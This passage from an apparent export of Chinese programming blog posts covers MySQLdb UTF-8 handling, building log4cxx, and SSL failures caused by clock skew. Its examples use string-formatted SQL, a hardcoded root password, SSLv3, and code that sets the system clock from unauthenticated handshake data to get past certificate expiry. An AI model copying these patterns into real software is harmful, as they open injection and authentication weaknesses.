#999999; background-color: #2d2d2d;\"> </span>   cursor.execute(<span style=\"color: #66cccc;\">'SET NAMES UTF8'</span>)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">sql</span> = <span style=\"color: #66cccc;\">'DROP DATABASE IF EXISTS mysqldb_utf8_test'</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   cursor.execute(sql)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">sql</span> = <span style=\"color: #66cccc;\">'CREATE DATABASE mysqldb_utf8_test DEFAULT CHARACTER SET utf8 COLLATE </span><span style=\"color: #66cccc; text-decoration: underline;\">utf8_general_ci'</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   cursor.execute(sql)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">mysql</span> = MySQLdb.connect(host=<span style=\"color: #66cccc;\">'localhost'</span>, user=<span style=\"color: #66cccc;\">'root'</span>, passwd=<span style=\"color: #66cccc;\">'123456'</span>, db=<span style=\"color: #66cccc;\">'</span><span style=\"color: #66cccc; text-decoration: underline;\">mysqldb_utf8_test'</span><span style=\"text-decoration: underline;\">, charset=</span><span style=\"color: #66cccc; text-decoration: underline;\">'utf8'</span><span style=\"text-decoration: underline;\">)</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">cursor</span> = mysql.cursor()\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   cursor.execute(<span style=\"color: #66cccc;\">'SET NAMES UTF8'</span>)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">sql</span> = <span style=\"color: #66cccc;\">'CREATE TABLE utf8_table(key_field VARCHAR(32) NOT NULL, value_field V</span><span style=\"color: #66cccc; text-decoration: underline;\">ARCHAR(255) NOT NULL)'</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   cursor.execute(sql)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">key</span> = <span style=\"color: #66cccc;\">'tangxinfa'</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">value</span> = <span style=\"color: #66cccc;\">'&#22909;&#20154;&#19968;&#20010;'</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">sql</span> = <span style=\"color: #66cccc;\">'INSERT INTO utf8_table VALUES(\"%s\", \"%s\")'</span>%(key, value)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   cursor.execute(sql)       <span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">&#27880;&#24847;&#26576;&#20123;&#26087;&#29256;&#26412;&#30340;mysql&#65288;&#22914;4.1.22&#20197;&#19979;&#65289;&#65292;mysql.character_set_name</span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">()&#24635;&#26159;&#36820;&#22238;latin1&#65292;&#20250;&#24341;&#36215;&#20081;&#30721;&#65292;&#38656;&#35201;&#25913;&#20026;cursor.execute('INSERT INTO utf8_table VALUES(\"%s\", \"%s\")', (key, value))</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">sql</span> = <span style=\"color: #66cccc;\">'select * from utf8_table'</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   cursor.execute(sql)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">for</span> record <span style=\"color: #99cc99;\">in</span> cursor.fetchall():\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">for</span> item <span style=\"color: #99cc99;\">in</span> record:\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">print</span> item.encode(<span style=\"color: #66cccc;\">'utf8'</span>)\n</pre>\n</div>\n</dd>\n\n<dt> 参考 </dt><dd><ul class=\"org-ul\">\n<li><a href=\"http://mysql-python.sourceforge.net/MySQLdb.html\">http://mysql-python.sourceforge.net/MySQLdb.html</a>\n</li>\n<li><a href=\"http://bbs.phpchina.com/viewthread.php?tid=13861\">http://bbs.phpchina.com/viewthread.php?tid=13861</a>\n</li>\n<li><a href=\"http://hi.baidu.com/ak456/blog/item/c318502394aa20569922ed7b.html\">http://hi.baidu.com/ak456/blog/item/c318502394aa20569922ed7b.html</a>\n</li>\n</ul>\n</dd>\n</dl>\n"
},
{
  "title": "log4cxx使用心得",
  "timestamp": "2008-06-17 10:01:00",
  "tags": [
    "log4cxx"
  ],
  "body": "<ul class=\"org-ul\">\n<li>简介\n\n<p>\napache出品必属精品。正宗c++日志库，与log4j一脉相承。\n</p>\n\n<p>\n<a href=\"http://logging.apache.org/log4cxx/index.html\">http://logging.apache.org/log4cxx/index.html</a>\n</p>\n</li>\n\n<li>下载、编译、安装\n\n<p>\n打算安装到${HOME}/libs目录下：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">cd</span> ~/libs\nwget http://mirror.bjtu.edu.cn/apache//apr/apr-1.4.4.tar.bz2\ntar xjvf apr-1.4.4.tar.bz2\n<span style=\"color: #cc99cc;\">cd</span> apr-1.4.4\n./configure --prefix=${<span style=\"color: #ffcc66;\">HOME</span>}/libs &amp;&amp; make &amp;&amp; make install\n<span style=\"color: #cc99cc;\">cd</span> ..\nwget http://mirror.bjtu.edu.cn/apache//apr/apr-util-1.3.11.tar.bz2\ntar xjvf apr-util-1.3.11.tar.bz2\n<span style=\"color: #cc99cc;\">cd</span> apr-util-1.3.11\n./configure --prefix=${<span style=\"color: #ffcc66;\">HOME</span>}/libs --with-apr=${<span style=\"color: #ffcc66;\">HOME</span>}/libs &amp;&amp; make &amp;&amp; make instal<span style=\"text-decoration: underline;\">l</span>\n<span style=\"color: #cc99cc;\">cd</span> ..\nwget http://apache.etoak.com//logging/log4cxx/0.10.0/apache-log4cxx-0.10.0.tar.g<span style=\"text-decoration: underline;\">z</span>\ntar xzvf apache-log4cxx-0.10.0.tar.gz\n<span style=\"color: #cc99cc;\">cd</span> apache-log4cxx-0.10.0\n./configure --with-charset=utf-8 --prefix=${<span style=\"color: #ffcc66;\">HOME</span>}/libs --with-apr=${<span style=\"color: #ffcc66;\">HOME</span>}/libs -<span style=\"text-decoration: underline;\">-with-apr-util=${</span><span style=\"color: #ffcc66; text-decoration: underline;\">HOME</span><span style=\"text-decoration: underline;\">}/libs &amp;&amp; make &amp;&amp; make install</span>\n</pre>\n</div>\n</li>\n\n<li>使用例子\n\n<p>\n<code>hello.cpp</code> ：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-cpp\"><span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">\"log4cxx/logger.h\"</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">\"log4cxx/propertyconfigurator.h\"</span>\n\n<span style=\"color: #99cc99;\">static</span> <span style=\"color: #6699cc;\">log4cxx</span>::<span style=\"color: #6699cc;\">LoggerPtr</span> <span style=\"color: #f99157;\">logger</span>(<span style=\"color: #6699cc;\">log4cxx</span>::<span style=\"color: #6699cc;\">Logger</span>::getLogger(<span style=\"color: #66cccc;\">\"hello\"</span>));\n\n<span style=\"color: #6699cc;\">int</span> <span style=\"color: #f99157;\">main</span>(<span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">argc</span>, <span style=\"color: #6699cc;\">char</span> *<span style=\"color: #ffcc66;\">argv</span>[])\n{\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #6699cc;\">log4cxx</span>::<span style=\"color: #6699cc;\">PropertyConfigurator</span>::configure(<span style=\"color: #66cccc;\">\"./log4cxx_hello.properties\"</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> LOG4CXX_INFO(logger, <span style=\"color: #66cccc;\">\"&#20320;&#22909;&#65292;log4cxx!\"</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #99cc99;\">return</span> 0;\n}\n</pre>\n</div>\n\n<p>\n<code>log4cxx_hello.properties</code> ：\n</p>\n<pre class=\"example\">\nlog4j.rootLogger=debug, R\n\nlog4j.appender.stdout=org.apache.log4j.ConsoleAppender\nlog4j.appender.stdout.layout=org.apache.log4j.PatternLayout\n\n# Pattern to output the caller's file name and line number.\nlog4j.appender.stdout.layout.ConversionPattern=%5p [%t] (%F:%L) - %m%n\n\nlog4j.appender.R=org.apache.log4j.RollingFileAppender\nlog4j.appender.R.File=./hello.log\n\nlog4j.appender.R.MaxFileSize=100KB\n# Keep one backup file\nlog4j.appender.R.MaxBackupIndex=10\n\nlog4j.appender.R.layout=org.apache.log4j.PatternLayout\nlog4j.appender.R.layout.ConversionPattern=%5p %c [%t] (%F:%L) - %m%n\n</pre>\n\n<p>\n编译：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">g++ -o hello hello.cpp -I${<span style=\"color: #ffcc66;\">HOME</span>}/libs/include ${<span style=\"color: #ffcc66;\">HOME</span>}/libs/lib/liblog4cxx.a ${<span style=\"color: #ffcc66;\">HO</span><span style=\"color: #ffcc66; text-decoration: underline;\">ME</span><span style=\"text-decoration: underline;\">}/libs/lib/libaprutil-1.a ${</span><span style=\"color: #ffcc66; text-decoration: underline;\">HOME</span><span style=\"text-decoration: underline;\">}/libs/lib/libapr-1.a  -lexpat -lpthread</span>\n</pre>\n</div>\n</li>\n\n<li>注意事项\n\n<p>\n由于一个日志文件写满后会重命名所有已有的日志文件，配置过大MaxBackupIndex的会有性能问题，因此log4cxx编译时限制了它的大小（大概十多个）以避免配置的MaxBackupIndex过大，如果要设置更大一点的MaxFileSize来保存更多日志，需要在编译前进行修改。\n</p>\n\n<p>\n参考：<a href=\"http://objectmix.com/apache/684503-urgent-log4cxx-large-window-sizes-not-allowed.html\">http://objectmix.com/apache/684503-urgent-log4cxx-large-window-sizes-not-allowed.html</a>\n</p>\n</li>\n\n<li>使用技巧\n<ul class=\"org-ul\">\n<li>决定配置文件的格式（xml，property）。以使用相应的配置器（Configurator）装入配置文件。\n\n<p>\nxml虽较property格式繁锁，支持的配置面更全，而property格式的配置文件使用更简单，容易在网上找到现成的配置文件。\n</p>\n</li>\n\n<li>logger命名\n\n<p>\nlogger名称反映了软件模块，如果有代表软件模块的类，则在类中包含以该类类名命名的logger对象，该模块功能相关代码通过该logger进行日志记录。\n另外可将logger对象作为全局变量，方便使用，特别是当软件模块较松散，并无对应的封装类时。\n</p>\n</li>\n\n<li>在代码中适当地放置日志代码。引用适当的日志对象，对日志进行适当分级。\n</li>\n\n<li>余下的工作就是修改配置文件，对日志进行控制了。\n</li>\n</ul>\n</li>\n</ul>\n\n<p>\n　　使用配置文件的好处就是可以方便地配置日志而不需要修改源代码，可以在配置文件中方便配置日志过滤、格式、日志目的地。\n</p>\n\n<ul class=\"org-ul\">\n<li>体验\n</li>\n</ul>\n\n<p>\n　之前产品中用到的是log4cplus，但是常常有写日志崩溃的情况出现，使用log4cxx正是用于解决该崩溃。</p>\n"
},
{
  "title": "SSL双方系统时间不一致导致的SSL连接失败及其解决方案",
  "timestamp": "2008-07-25 17:45:00",
  "tags": [
    "openssl",
    "c"
  ],
  "body": "<p>\n在产品使用中，实施人员常常报告服务器与客户端无法连接，最终查明原因是双方的时间设置不一致。OpenSSL证书有一个有效时间段，当客户端或服务器的系统时间不在这个时间段内时SSL会因证书验证失败而无法连接。在实施中系统时间错误是很常见的，因不能上网而未开时间自动同步、bios没电了、客户疏忽等原因都会导致系统时间设置错误。如果连接失败后再查看系统时间设置进行故障排查终归是一件麻烦的事情。\n</p>\n\n<p>\n解决这个问题有以下几个办法：\n</p>\n\n<ul class=\"org-ul\">\n<li>将证书的有效期设置得够大（如：1970-2099）\n\n<p>\n这样估计可以在一定程度上解决这个问题，不过这也是个馊主意，一般申请的证书总会有一个合理的有效期。\n</p>\n</li>\n\n<li>检测及必要时自动同步客户端与服务器的时间\n\n<p>\n通过用wireshake抓包分析SSL建立连接的过程，发现在SSL握手过程中，会向对方传送本机的系统时间。因此一个显而易见的办法就是，当连接过程中检测到证书过期，将客户端的时间同步为服务器端的时间，再重连即可。\n</p>\n\n<p>\n下面是具体的示例代码：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\"><span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;openssl/ssl.h&gt;</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;openssl/bio.h&gt;</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;openssl/err.h&gt;</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;winsock2.h&gt;</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;stdio.h&gt;</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;string.h&gt;</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;time.h&gt;</span>\n\n<span style=\"color: #99cc99;\">typedef</span> <span style=\"color: #99cc99;\">struct</span> <span style=\"color: #6699cc;\">_TimeInfo</span>\n{\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">time_t</span> <span style=\"color: #ffcc66;\">client</span>;  <span style=\"color: #999999; font-style: italic;\">/*</span><span style=\"color: #999999; font-style: italic;\">&#23458;&#25143;&#31471;&#30340;&#26102;&#38388;</span><span style=\"color: #999999; font-style: italic;\">*/</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">time_t</span> <span style=\"color: #ffcc66;\">server</span>;  <span style=\"color: #999999; font-style: italic;\">/*</span><span style=\"color: #999999; font-style: italic;\">&#26381;&#21153;&#22120;&#30340;&#26102;&#38388;</span><span style=\"color: #999999; font-style: italic;\">*/</span>\n} <span style=\"color: #6699cc;\">TimeInfo</span>;\n\n<span style=\"color: #cc99cc;\">/**</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span><span style=\"color: #cc99cc;\">* &#21516;&#27493;&#31995;&#32479;&#26102;&#38388;.</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span><span style=\"color: #cc99cc;\">*/</span>\n<span style=\"color: #6699cc;\">BOOL</span> <span style=\"color: #f99157;\">syncSystemTime</span>(<span style=\"color: #6699cc;\">time_t</span> <span style=\"color: #ffcc66;\">t</span>)\n{\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">SYSTEMTIME</span> <span style=\"color: #ffcc66;\">st</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">FILETIME</span>   <span style=\"color: #ffcc66;\">ft</span>;<span style=\"color: #f99157; background-color: #515151;\">  </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">LONGLONG</span>   <span style=\"color: #ffcc66;\">ll</span>;<span style=\"color: #f99157; background-color: #515151;\">  </span>\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   ll = Int32x32To64(t, 10000000) + 116444736000000000; <span style=\"color: #999999; font-style: italic;\">//</span><span style=\"color: #999999; font-style: italic;\">1970.01.01</span><span style=\"color: #f99157; background-color: #515151;\">  </span>\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   ft.dwLowDateTime  = (<span style=\"color: #6699cc;\">DWORD</span>)ll;<span style=\"color: #f99157; background-color: #515151;\">  </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   ft.dwHighDateTime = (<span style=\"color: #6699cc;\">DWORD</span>)(ll &gt;&gt; 32);<span style=\"color: #f99157; background-color: #515151;\">  </span>\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> FileTimeToSystemTime(&amp;ft, &amp;st) &amp;&amp; SetSystemTime(&amp;st);\n}\n\n<span style=\"color: #cc99cc;\">/**</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span><span style=\"color: #cc99cc;\">* &#33719;&#21462;SSL&#25569;&#25163;&#36807;&#31243;&#20013;&#26381;&#21153;&#22120;&#19982;&#23458;&#25143;&#31471;&#21452;&#26041;&#30340;&#31995;&#32479;&#26102;&#38388;.</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span><span style=\"color: #cc99cc;\">*/</span>\n<span style=\"color: #6699cc;\">void</span> <span style=\"color: #f99157;\">getSSLHandleShakeTimeInfo</span>(<span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">write_p</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">version</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">content_type</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #99cc99;\">const</span> <span style=\"color: #6699cc;\">unsigned</span> <span style=\"color: #6699cc;\">char</span>* <span style=\"color: #ffcc66;\">buf</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #6699cc;\">size_t</span> <span style=\"color: #ffcc66;\">len</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #6699cc;\">SSL</span> *<span style=\"color: #ffcc66;\">ssl</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  <span style=\"color: #6699cc;\">TimeInfo</span> *<span style=\"color: #ffcc66;\">ti</span>)\n{\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(content_type != 22)   <span style=\"color: #999999; font-style: italic;\">//</span><span style=\"color: #999999; font-style: italic;\">require handshake message</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(len &lt; 42)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(buf[0] == 1)          <span style=\"color: #999999; font-style: italic;\">//</span><span style=\"color: #999999; font-style: italic;\">ClientHello Message send from client to server</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   ti-&gt;client = htonl(*((<span style=\"color: #6699cc;\">u_long</span>*)(buf + 6)));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">else</span> <span style=\"color: #99cc99;\">if</span>(buf[0] == 2)     <span style=\"color: #999999; font-style: italic;\">//</span><span style=\"color: #999999; font-style: italic;\">ServerHello Message send from server to client</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   ti-&gt;server = htonl(*((<span style=\"color: #6699cc;\">u_long</span>*)(buf + 6)));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">else</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span>;\n}\n\n<span style=\"color: #6699cc;\">int</span> <span style=\"color: #f99157;\">main</span>()\n{\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">BIO</span> * <span style=\"color: #ffcc66;\">bio</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">SSL</span> * <span style=\"color: #ffcc66;\">ssl</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">SSL_CTX</span> * <span style=\"color: #ffcc66;\">ctx</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">TimeInfo</span> <span style=\"color: #ffcc66;\">timeInfo</span> = {-1, -1};\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">BOOL</span> <span style=\"color: #ffcc66;\">timeSynced</span> = FALSE;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">long</span> <span style=\"color: #ffcc66;\">result</span>;\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">/* </span><span style=\"color: #999999; font-style: italic;\">Set up the library </span><span style=\"color: #999999; font-style: italic;\">*/</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   SSL_library_init();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   ERR_load_BIO_strings();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   SSL_load_error_strings();\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">/* </span><span style=\"color: #999999; font-style: italic;\">Set up the SSL context </span><span style=\"color: #999999; font-style: italic;\">*/</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   ctx = SSL_CTX_new(SSLv3_client_method());\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(ctx == <span style=\"color: #6699cc;\">NULL</span>)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fprintf(stderr, <span style=\"color: #66cccc;\">\"Error new SSL_CTX\\n\"</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   ERR_print_errors_fp(stderr);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   SSL_CTX_free(ctx);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> 0;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">/* </span><span style=\"color: #999999; font-style: italic;\">Get Server and Client system time via SSL Handshake </span><span style=\"color: #999999; font-style: italic;\">*/</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   SSL_CTX_set_msg_callback(ctx, getSSLHandleShakeTimeInfo);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   SSL_CTX_set_msg_callback_arg(ctx, &amp;timeInfo);\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">/* </span><span style=\"color: #999999; font-style: italic;\">Load the trust store </span><span style=\"color: #999999; font-style: italic;\">*/</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(<span style=\"color: #6699cc;\">!</span> SSL_CTX_load_verify_locations(ctx, <span style=\"color: #66cccc;\">\".\\\\certs\\\\cacert.pem\"</span>, <span style=\"color: #6699cc;\">NULL</span>))\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fprintf(stderr, <span style=\"color: #66cccc;\">\"Error loading trust store\\n\"</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   ERR_print_errors_fp(stderr);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   SSL_CTX_free(ctx);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> 0;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">/* </span><span style=\"color: #999999; font-style: italic;\">Setup the connection </span><span style=\"color: #999999; font-style: italic;\">*/</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   bio = BIO_new_ssl_connect(ctx);\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">/* </span><span style=\"color: #999999; font-style: italic;\">Set the SSL_MODE_AUTO_RETRY flag </span><span style=\"color: #999999; font-style: italic;\">*/</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   BIO_get_ssl(bio, &amp; ssl);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">/* </span><span style=\"color: #999999; font-style: italic;\">Create and setup the connection </span><span style=\"color: #999999; font-style: italic;\">*/</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   BIO_set_conn_hostname(bio, <span style=\"color: #66cccc;\">\"192.168.1.5:5555\"</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(BIO_do_connect(bio) &lt;= 0)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fprintf(stderr, <span style=\"color: #66cccc;\">\"Error attempting to connect\\n\"</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   ERR_print_errors_fp(stderr);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   BIO_free_all(bio);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   SSL_CTX_free(ctx);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: 